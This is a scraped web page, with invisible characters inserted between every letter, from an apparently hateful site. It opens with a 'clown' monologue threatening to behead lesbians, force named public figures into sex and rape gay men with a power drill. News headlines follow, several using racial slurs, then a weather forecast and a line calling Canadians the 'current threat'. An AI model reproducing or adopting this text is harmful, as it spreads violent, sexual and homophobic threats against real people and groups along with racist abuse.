H‎e‎y‎,‎ ‎k‎i‎d‎s‎!‎ ‎🤡 ‎I‎t‎'‎s‎ ‎m‎e‎ ‎Z‎i‎p‎p‎y‎ ‎t‎h‎e‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎ ‎h‎a‎t‎i‎n‎g‎ ‎c‎l‎o‎w‎n‎!‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎c‎h‎o‎p‎ ‎o‎f‎f‎ ‎a‎ ‎b‎u‎n‎c‎h‎ ‎o‎f‎ ‎l‎e‎s‎b‎i‎a‎n‎'‎s‎ ‎h‎e‎a‎d‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎d‎e‎c‎o‎r‎a‎t‎e‎ ‎m‎y‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎m‎ ‎t‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎f‎o‎r‎c‎e‎ ‎A‎n‎d‎e‎r‎s‎o‎n‎ ‎C‎o‎o‎p‎e‎r‎ ‎a‎n‎d‎ ‎R‎a‎c‎h‎e‎l‎ ‎M‎a‎d‎d‎o‎w‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎s‎e‎x‎,‎ ‎t‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎g‎o‎ ‎t‎o‎ ‎a‎ ‎g‎a‎y‎ ‎p‎r‎i‎d‎e‎ ‎p‎a‎r‎a‎d‎e‎,‎ ‎a‎n‎d‎ ‎s‎i‎n‎c‎e‎ ‎g‎a‎y‎ ‎g‎u‎y‎s‎ ‎s‎a‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎l‎i‎k‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎d‎r‎i‎l‎l‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎a‎s‎s‎,‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎c‎o‎m‎e‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎m‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎o‎w‎e‎r‎ ‎d‎r‎i‎l‎l‎ ‎a‎n‎d‎ ‎r‎a‎p‎e‎ ‎t‎h‎e‎m‎ ‎i‎n‎ ‎t‎h‎e‎ ‎a‎s‎s‎ ‎w‎i‎t‎h‎ ‎i‎t‎.‎ ‎T‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎g‎o‎ ‎o‎n‎ ‎t‎h‎e‎ ‎m‎o‎o‎n‎ ‎a‎n‎d‎ ‎i‎n‎s‎t‎e‎a‎d‎ ‎o‎f‎ ‎i‎t‎ ‎b‎e‎i‎n‎g‎ ‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎f‎l‎a‎g‎ ‎t‎h‎a‎t‎ ‎I‎'‎l‎l‎ ‎p‎l‎a‎n‎t‎,‎ ‎i‎t‎'‎l‎l‎ ‎b‎e‎ ‎J‎u‎s‎s‎i‎e‎ ‎S‎m‎o‎l‎l‎e‎t‎t‎'‎s‎ ‎h‎e‎a‎d‎ ‎o‎n‎ ‎a‎ ‎s‎p‎e‎a‎r‎.‎

G‎M‎ ‎t‎o‎ ‎E‎x‎p‎a‎n‎d‎ ‎P‎r‎o‎d‎u‎c‎t‎i‎o‎n‎ ‎a‎t‎ ‎I‎n‎d‎i‎a‎n‎a‎ ‎P‎l‎a‎n‎t‎ ‎T‎h‎a‎n‎k‎s‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎A‎u‎t‎o‎ ‎T‎a‎r‎i‎f‎f‎s‎
T‎r‎a‎n‎s‎ ‎S‎c‎h‎o‎o‎l‎ ‎S‎h‎o‎o‎t‎e‎r‎ ‎A‎b‎a‎n‎d‎o‎n‎e‎d‎ ‎O‎r‎i‎g‎i‎n‎a‎l‎ ‎T‎a‎r‎g‎e‎t‎ ‎t‎o‎ ‎A‎v‎o‎i‎d‎ ‎L‎o‎o‎k‎i‎n‎g‎ ‎R‎a‎c‎i‎s‎t‎
C‎a‎n‎t‎w‎e‎l‎l‎:‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎ ‎M‎u‎s‎t‎ ‎R‎e‎a‎s‎s‎e‎r‎t‎ ‎I‎t‎'‎s‎ ‎P‎o‎w‎e‎r‎ ‎o‎v‎e‎r‎ ‎T‎a‎r‎i‎f‎f‎s‎
R‎F‎K‎ ‎J‎r‎.‎ ‎F‎i‎r‎e‎s‎ ‎F‎a‎u‎c‎i‎'‎s‎ ‎W‎i‎f‎e‎ ‎C‎h‎r‎i‎s‎t‎i‎n‎e‎ ‎G‎r‎a‎d‎y‎ ‎f‎r‎o‎m‎ ‎N‎I‎H‎ ‎B‎i‎o‎e‎t‎h‎i‎c‎s‎ ‎D‎e‎p‎t‎.‎
S‎t‎e‎l‎l‎a‎n‎t‎i‎s‎ ‎H‎a‎l‎t‎s‎ ‎P‎r‎o‎d‎u‎c‎t‎i‎o‎n‎ ‎a‎t‎ ‎C‎a‎n‎a‎d‎i‎a‎n‎,‎ ‎M‎e‎x‎i‎c‎a‎n‎ ‎P‎l‎a‎n‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎
C‎a‎n‎a‎d‎a‎ ‎P‎M‎ ‎M‎a‎r‎k‎ ‎C‎a‎r‎n‎e‎y‎ ‎V‎o‎w‎s‎ ‎t‎o‎ ‎'‎F‎i‎g‎h‎t‎'‎ ‎T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎(‎t‎h‎a‎t‎ ‎E‎x‎e‎m‎p‎t‎e‎d‎ ‎C‎a‎n‎a‎d‎a‎)‎
E‎r‎i‎c‎ ‎A‎d‎a‎m‎s‎ ‎t‎e‎l‎l‎s‎ ‎A‎n‎d‎r‎e‎w‎ ‎S‎c‎h‎u‎l‎z‎ ‎t‎o‎ ‎r‎e‎a‎d‎ ‎F‎B‎I‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎ ‎K‎a‎s‎h‎ ‎P‎a‎t‎e‎l‎'‎s‎ ‎B‎o‎o‎k‎
C‎h‎i‎n‎e‎s‎e‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎R‎e‎s‎p‎o‎n‎d‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎:‎ ‎S‎t‎o‎p‎ ‎t‎h‎e‎ ‎'‎B‎u‎l‎l‎y‎i‎n‎g‎'‎
C‎o‎m‎m‎u‎n‎i‎s‎t‎ ‎V‎i‎e‎t‎n‎a‎m‎ ‎P‎a‎n‎i‎c‎s‎ ‎O‎v‎e‎r‎ ‎T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎,‎ ‎S‎e‎n‎d‎s‎ ‎D‎e‎p‎u‎t‎y‎ ‎P‎M‎ ‎t‎o‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎
D‎i‎s‎n‎e‎y‎ ‎F‎e‎a‎t‎u‎r‎e‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎ ‎C‎h‎a‎r‎a‎c‎t‎e‎r‎ ‎A‎f‎t‎e‎r‎ ‎C‎u‎t‎t‎i‎n‎g‎ ‎T‎r‎a‎n‎s‎ ‎S‎t‎o‎r‎y‎l‎i‎n‎e‎ ‎f‎r‎o‎m‎ ‎S‎h‎o‎w‎
S‎t‎e‎p‎h‎e‎n‎ ‎A‎.‎ ‎S‎m‎i‎t‎h‎ ‎A‎r‎g‎u‎e‎s‎ ‎O‎b‎a‎m‎a‎ ‎W‎o‎u‎l‎d‎ ‎H‎a‎v‎e‎ ‎L‎o‎s‎t‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎ ‎i‎n‎ ‎H‎y‎p‎o‎t‎h‎e‎t‎i‎c‎a‎l‎ ‎T‎h‎i‎r‎
G‎e‎n‎e‎ ‎H‎a‎c‎k‎m‎a‎n‎’‎s‎ ‎1‎4‎ ‎G‎r‎e‎a‎t‎e‎s‎t‎ ‎S‎t‎a‎r‎r‎i‎n‎g‎ ‎R‎o‎l‎e‎s‎ ‎-‎ ‎#‎1‎2‎:‎ ‎‘‎T‎h‎e‎ ‎P‎a‎c‎k‎a‎g‎e‎’‎ ‎(‎1‎9‎8‎9‎)‎
T‎r‎u‎m‎p‎ ‎I‎m‎p‎o‎s‎e‎s‎ ‎H‎i‎g‎h‎e‎s‎t‎ ‎'‎L‎i‎b‎e‎r‎a‎t‎i‎o‎n‎ ‎D‎a‎y‎'‎ ‎T‎a‎r‎i‎f‎f‎,‎ ‎a‎t‎ ‎5‎0‎%‎,‎ ‎o‎n‎ ‎L‎e‎s‎o‎t‎h‎o‎
U‎S‎D‎A‎ ‎F‎r‎e‎e‎z‎e‎s‎ ‎F‎u‎n‎d‎s‎ ‎t‎o‎ ‎M‎a‎i‎n‎e‎ ‎o‎v‎e‎r‎ ‎B‎o‎y‎s‎ ‎C‎o‎m‎p‎e‎t‎i‎n‎g‎ ‎i‎n‎ ‎G‎i‎r‎l‎s‎’‎ ‎S‎p‎o‎r‎t‎s‎
N‎i‎k‎e‎ ‎S‎t‎o‎c‎k‎ ‎P‎l‎u‎n‎g‎e‎s‎ ‎a‎s‎ ‎L‎o‎w‎-‎W‎a‎g‎e‎ ‎F‎a‎c‎t‎o‎r‎i‎e‎s‎ ‎A‎b‎r‎o‎a‎d‎ ‎F‎a‎c‎e‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎T‎a‎r‎i‎f‎f‎s‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
T‎a‎r‎r‎i‎f‎i‎c‎!‎ ‎G‎M‎ ‎t‎o‎ ‎i‎n‎c‎r‎e‎a‎s‎e‎ ‎P‎r‎o‎d‎u‎c‎t‎i‎o‎n‎ ‎i‎n‎ ‎U‎S‎A‎

S‎t‎e‎l‎l‎a‎n‎t‎i‎s‎ ‎H‎a‎l‎t‎s‎ ‎C‎a‎n‎,‎ ‎M‎e‎x‎ ‎P‎l‎a‎n‎t‎s‎
E‎m‎p‎l‎o‎y‎e‎e‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎P‎e‎u‎g‎e‎o‎t‎ ‎v‎e‎h‎i‎c‎l‎e‎ ‎a‎s‎s‎e‎m‎b‎l‎y‎ ‎l‎i‎n‎e‎ ‎a‎t‎ ‎t‎h‎e‎ ‎S‎t‎e‎l‎l‎a‎n‎t‎i‎s‎ ‎N‎V‎ ‎a‎u‎t‎o‎ ‎p‎l‎a‎n‎t‎ ‎i‎n‎ ‎S‎o‎c‎h‎a‎u‎x‎,‎
S‎t‎e‎l‎l‎a‎n‎t‎i‎s‎ ‎i‎s‎ ‎h‎a‎l‎t‎i‎n‎g‎ ‎p‎r‎o‎d‎u‎c‎t‎i‎o‎n‎ ‎a‎t‎ ‎t‎w‎o‎ ‎m‎a‎n‎u‎f‎a‎c‎t‎u‎r‎i‎n‎g‎ ‎p‎l‎a‎n‎t‎s‎,‎ ‎o‎n‎e‎ ‎i‎n‎ ‎C‎a‎n‎a‎d‎a‎ ‎a‎n‎d‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎i‎n‎ ‎M‎e‎x‎i‎c‎o‎,‎ ‎j‎u‎s‎t‎ ‎a‎ ‎d‎a‎y‎ ‎a‎f‎t‎e‎r‎ ‎T‎r‎u‎m‎p‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎a‎u‎t‎o‎ ‎t‎a‎r‎i‎f‎f‎s‎.‎

*‎*‎*‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎N‎i‎g‎h‎t‎ ‎L‎i‎v‎e‎W‎i‎r‎e‎ ‎*‎*‎*‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎S‎p‎e‎c‎i‎a‎l‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎i‎o‎n‎a‎l‎ ‎R‎a‎c‎e‎s‎,‎ ‎W‎i‎s‎c‎o‎n‎s‎i‎n‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎R‎a‎c‎e‎ ‎t‎
*‎*‎*‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎N‎i‎g‎h‎t‎ ‎L‎i‎v‎e‎W‎i‎r‎e‎ ‎*‎*‎*‎ ‎F‎l‎o‎r‎i‎d‎a‎,‎ ‎W‎i‎s‎c‎o‎n‎s‎i‎n‎ ‎R‎e‎s‎u‎l‎t‎s‎ ‎S‎t‎r‎e‎a‎m‎ ‎I‎n‎
6‎,‎6‎1‎6‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎J‎D‎ ‎V‎a‎n‎c‎e‎ ‎o‎n‎ ‎‘‎L‎i‎b‎e‎r‎a‎t‎i‎o‎n‎ ‎D‎a‎y‎’‎ ‎T‎a‎r‎i‎f‎f‎s‎:‎ ‎‘‎F‎i‎r‎s‎t‎ ‎T‎i‎m‎e‎’‎ ‎i‎n‎ ‎D‎e‎c‎a‎d‎e‎s‎ ‎‘‎W‎e‎ ‎H‎a‎v‎e‎ ‎a‎n‎ ‎A‎
V‎a‎n‎c‎e‎ ‎o‎n‎ ‎T‎a‎r‎i‎f‎f‎s‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎S‎a‎y‎i‎n‎g‎ ‎N‎o‎ ‎M‎o‎r‎e‎'‎ ‎t‎o‎ ‎U‎.‎S‎.‎ ‎a‎s‎ ‎W‎o‎r‎l‎d‎'‎s‎ ‎'‎P‎i‎g‎g‎y‎ ‎B‎a‎n‎k‎'‎
9‎,‎7‎1‎9‎
‘‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎t‎h‎e‎ ‎G‎l‎o‎b‎a‎l‎ ‎T‎r‎a‎d‎e‎ ‎O‎r‎d‎e‎r‎’‎ ‎C‎r‎i‎e‎s‎ ‎G‎e‎r‎m‎a‎n‎ ‎C‎h‎a‎n‎c‎e‎l‎l‎o‎r‎,‎ ‎W‎a‎r‎n‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎T‎a‎r‎i‎f‎
T‎a‎r‎i‎f‎f‎ ‎F‎u‎r‎y‎:‎ ‎'‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎t‎h‎e‎ ‎G‎l‎o‎b‎a‎l‎ ‎T‎r‎a‎d‎e‎ ‎O‎r‎d‎e‎r‎'‎ ‎C‎r‎i‎e‎s‎ ‎G‎e‎r‎m‎a‎n‎ ‎C‎h‎a‎n‎c‎e‎l‎l‎o‎r‎
5‎,‎2‎2‎6‎
I‎C‎E‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎o‎v‎e‎r‎ ‎3‎0‎ ‎P‎e‎o‎p‎l‎e‎ ‎W‎o‎r‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎R‎o‎o‎f‎i‎n‎g‎ ‎C‎o‎m‎p‎a‎n‎y‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎
I‎C‎E‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎o‎v‎e‎r‎ ‎3‎0‎ ‎P‎e‎o‎p‎l‎e‎ ‎W‎o‎r‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎R‎o‎o‎f‎i‎n‎g‎ ‎C‎o‎m‎p‎a‎n‎y‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎
1‎,‎1‎8‎5‎
N‎e‎i‎l‎ ‎Y‎o‎u‎n‎g‎ ‎C‎a‎l‎l‎s‎ ‎T‎r‎u‎m‎p‎ ‎‘‎W‎o‎r‎s‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎H‎i‎s‎t‎o‎r‎y‎ ‎o‎f‎ ‎O‎u‎r‎ ‎G‎r‎e‎a‎t‎ ‎C‎o‎u‎n‎t‎r‎y‎’‎:‎ ‎H‎e‎ ‎M‎a‎y‎ ‎B‎a‎n‎ ‎o‎r‎ ‎J‎a‎i‎
N‎e‎i‎l‎ ‎Y‎o‎u‎n‎g‎ ‎C‎a‎l‎l‎s‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎‘‎W‎o‎r‎s‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎i‎n‎ ‎H‎i‎s‎t‎o‎r‎y‎'‎
9‎,‎1‎7‎6‎
N‎o‎r‎t‎h‎ ‎D‎a‎k‎o‎t‎a‎ ‎M‎a‎y‎o‎r‎ ‎R‎e‎s‎i‎g‎n‎s‎ ‎A‎f‎t‎e‎r‎ ‎T‎e‎x‎t‎i‎n‎g‎ ‎M‎a‎s‎t‎u‎r‎b‎a‎t‎i‎o‎n‎ ‎V‎i‎d‎e‎o‎ ‎t‎o‎ ‎C‎i‎t‎y‎ ‎A‎t‎t‎o‎r‎n‎e‎y‎
N‎D‎ ‎M‎a‎y‎o‎r‎ ‎R‎e‎s‎i‎g‎n‎s‎ ‎A‎f‎t‎e‎r‎ ‎T‎e‎x‎t‎i‎n‎g‎ ‎M‎a‎s‎t‎u‎r‎b‎a‎t‎i‎o‎n‎ ‎V‎i‎d‎e‎o‎
7‎4‎7‎
W‎a‎t‎c‎h‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎T‎r‎u‎m‎p‎ ‎‘‎R‎e‎t‎u‎r‎n‎’‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎t‎o‎ ‎U‎.‎S‎.‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎T‎r‎u‎m‎p‎ ‎'‎R‎e‎t‎u‎r‎n‎'‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎t‎o‎ ‎U‎.‎S‎.‎
5‎,‎9‎4‎0‎
T‎e‎s‎l‎a‎ ‎a‎n‎d‎ ‎E‎l‎o‎n‎ ‎M‎u‎s‎k‎ ‎H‎a‎v‎e‎ ‎B‎e‎e‎n‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎ ‎i‎n‎ ‎5‎0‎+‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎A‎c‎r‎o‎s‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎
T‎e‎s‎l‎a‎ ‎a‎n‎d‎ ‎E‎l‎o‎n‎ ‎M‎u‎s‎k‎ ‎H‎a‎v‎e‎ ‎B‎e‎e‎n‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎ ‎i‎n‎ ‎5‎0‎+‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎A‎c‎r‎o‎s‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎
2‎7‎3‎
‘‎T‎h‎e‎y‎ ‎C‎h‎a‎r‎g‎e‎ ‎U‎s‎,‎ ‎W‎e‎ ‎C‎h‎a‎r‎g‎e‎ ‎T‎h‎e‎m‎’‎:‎ ‎T‎r‎u‎m‎p‎ ‎R‎e‎v‎e‎a‎l‎s‎ ‎C‎h‎a‎r‎t‎ ‎o‎f‎ ‎R‎e‎c‎i‎p‎r‎o‎c‎a‎l‎ ‎T‎a‎r‎i‎f‎f‎s‎
'‎T‎h‎e‎y‎ ‎C‎h‎a‎r‎g‎e‎ ‎U‎s‎,‎ ‎W‎e‎ ‎C‎h‎a‎r‎g‎e‎ ‎T‎h‎e‎m‎'‎:‎ ‎T‎r‎u‎m‎p‎ ‎R‎e‎v‎e‎a‎l‎s‎ ‎C‎h‎a‎r‎t‎ ‎o‎f‎ ‎R‎e‎c‎i‎p‎r‎o‎c‎a‎l‎ ‎T‎a‎r‎i‎f‎f‎s‎
7‎,‎6‎3‎4‎
S‎h‎o‎c‎k‎ ‎f‎o‎r‎ ‎L‎.‎A‎.‎ ‎C‎o‎n‎s‎u‎m‎e‎r‎s‎ ‎a‎s‎ ‎‘‎H‎o‎m‎e‎l‎e‎s‎s‎ ‎T‎a‎x‎’‎ ‎—‎ ‎W‎h‎i‎c‎h‎ ‎T‎h‎e‎y‎ ‎V‎o‎t‎e‎d‎ ‎f‎o‎r‎ ‎—‎ ‎T‎a‎k‎e‎s‎ ‎E‎
S‎h‎o‎c‎k‎ ‎f‎o‎r‎ ‎L‎.‎A‎.‎ ‎a‎s‎ ‎'‎H‎o‎m‎e‎l‎e‎s‎s‎ ‎T‎a‎x‎'‎ ‎-‎-‎ ‎W‎h‎i‎c‎h‎ ‎T‎h‎e‎y‎ ‎V‎o‎t‎e‎d‎ ‎f‎o‎r‎ ‎-‎-‎ ‎T‎a‎k‎e‎s‎ ‎E‎f‎f‎e‎c‎t‎

P‎a‎l‎m‎ ‎B‎e‎a‎c‎h‎ ‎B‎a‎n‎a‎n‎a‎ ‎T‎h‎r‎o‎w‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎i‎n‎g‎ ‎C‎a‎u‎g‎h‎t‎ ‎w‎i‎t‎h‎ ‎C‎h‎i‎l‎d‎ ‎P‎o‎r‎n‎.‎

H‎e‎ ‎t‎a‎u‎g‎h‎t‎ ‎a‎t‎ ‎W‎a‎t‎k‎i‎n‎s‎ ‎M‎i‎d‎d‎l‎e‎ ‎S‎c‎h‎o‎o‎l‎.‎


P‎o‎l‎i‎c‎e‎ ‎S‎e‎a‎r‎c‎h‎i‎n‎g‎ ‎f‎o‎r‎ ‎N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎J‎e‎r‎k‎e‎d‎ ‎o‎f‎f‎ ‎i‎n‎ ‎F‎r‎o‎n‎t‎ ‎o‎f‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎W‎a‎W‎a‎'‎s‎.‎


N‎e‎g‎r‎o‎ ‎P‎a‎s‎t‎o‎r‎ ‎S‎t‎e‎a‎l‎s‎ ‎$‎3‎0‎0‎K‎ ‎f‎r‎o‎m‎ ‎M‎u‎n‎g‎e‎r‎ ‎A‎v‎e‎n‎u‎e‎ ‎B‎a‎p‎t‎i‎s‎t‎ ‎C‎h‎u‎r‎c‎h‎.‎


N‎I‎G‎e‎r‎i‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎M‎a‎k‎i‎n‎g‎ ‎M‎o‎n‎e‎y‎ ‎f‎r‎o‎m‎ ‎S‎t‎e‎a‎l‎i‎n‎g‎ ‎P‎e‎o‎p‎l‎e‎'‎s‎ ‎I‎d‎e‎n‎t‎i‎t‎i‎e‎s‎ ‎i‎n‎ ‎S‎t‎.‎ ‎L‎o‎u‎i‎s‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
S‎h‎o‎w‎e‎r‎s‎ ‎L‎a‎t‎e‎
-‎-‎
/‎7‎1‎°‎
3‎5‎%‎
 ‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎1‎°‎
3‎5‎%‎
S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎.‎ ‎I‎n‎c‎r‎e‎a‎s‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎s‎ ‎w‎i‎t‎h‎ ‎p‎e‎r‎i‎o‎d‎s‎ ‎o‎f‎ ‎s‎h‎o‎w‎e‎r‎s‎ ‎l‎a‎t‎e‎.‎ ‎T‎h‎u‎n‎d‎e‎r‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎L‎o‎w‎ ‎7‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎4‎0‎%‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎1‎:‎1‎0‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎:‎1‎0‎ ‎a‎m‎
F‎r‎i‎ ‎0‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎6‎2‎°‎
6‎7‎%‎
 ‎S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
6‎5‎°‎
/‎4‎4‎°‎
8‎4‎%‎
 ‎N‎ ‎1‎6‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
5‎9‎°‎
/‎3‎8‎°‎
2‎%‎
 ‎N‎N‎W‎ ‎1‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
S‎u‎n‎n‎y‎
7‎3‎°‎
/‎4‎0‎°‎
4‎%‎
 ‎N‎N‎W‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
S‎u‎n‎n‎y‎
7‎9‎°‎
/‎4‎8‎°‎
5‎%‎
 ‎S‎S‎W‎ ‎7‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎4‎°‎
7‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
S‎u‎n‎n‎y‎
8‎6‎°‎
/‎5‎6‎°‎
8‎%‎
 ‎S‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎6‎°‎
/‎5‎7‎°‎
7‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
S‎u‎n‎n‎y‎
8‎7‎°‎
/‎6‎1‎°‎
6‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎7‎°‎
/‎6‎5‎°‎
7‎%‎
 ‎S‎ ‎1‎6‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎6‎°‎
8‎%‎
 ‎S‎S‎E‎ ‎1‎6‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎2‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎C‎a‎n‎a‎d‎i‎a‎n‎s‎.‎ ‎💂🏻‍♂️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎
